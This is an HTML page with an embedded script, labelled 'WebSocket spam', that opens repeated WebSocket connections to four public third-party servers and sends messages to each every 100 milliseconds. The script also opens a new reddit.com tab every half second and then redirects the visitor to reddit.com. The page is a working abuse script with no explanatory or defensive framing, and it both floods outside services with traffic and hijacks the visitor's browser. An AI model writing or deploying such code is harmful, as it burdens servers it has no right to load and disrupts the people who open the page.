<!DOCTYPE html>
<html>
<body>
<script>
console.log('Starting WebSocket spam...');

// WebSocket servers that might work
const wsServers = [
    'wss://ws.postman-echo.com/raw',
    'wss://echo.websocket.org',
    'wss://stream.binance.com:9443/ws',
    'wss://socket.donationalerts.ru:443'
];

let wsConnections = [];

// Create multiple WebSocket connections
function createWebSockets() {
    wsServers.forEach(server => {
        try {
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const ws = new WebSocket(server);
                    ws.onopen = () => {
                        console.log(`WS ${i} connected to ${server}`);
                        // Spam messages
                        setInterval(() => {
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send('GET / HTTP/1.1\r\nHost: reddit.com\r\n\r\n');
                                ws.send(JSON.stringify({url: 'https://reddit.com'}));
                            }
                        }, 100);
                    };
                    wsConnections.push(ws);
                }, i * 100);
            }
        } catch (e) {}
    });
}

createWebSockets();

// Also open regular tabs
setInterval(() => {
    window.open('https://reddit.com', '_ws' + Date.now());
}, 500);

// Redirect after 20s
setTimeout(() => {
    window.location.href = 'https://reddit.com';
}, 20000);
</script>
</body>
</html>
